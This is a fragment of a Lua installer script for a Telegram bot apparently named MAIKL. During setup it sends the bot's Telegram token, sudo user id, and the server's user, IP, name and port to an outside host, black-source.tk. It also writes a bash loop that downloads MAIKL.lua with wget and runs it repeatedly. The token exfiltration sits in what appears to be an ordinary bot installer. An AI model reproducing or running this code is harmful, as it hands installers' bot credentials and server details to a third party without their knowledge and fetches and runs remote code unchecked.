...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/MAIKLTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("MAIKL", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/MAIKL
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr MAIKL.lua
wget "https://raw.githubusercontent.com/MAIKL/MAIKL/master/MAIKL.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./MAIKL.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S MAIKL -X kill
screen -S MAIKL ./MAIKL
done
]])
RunTs:close()
end
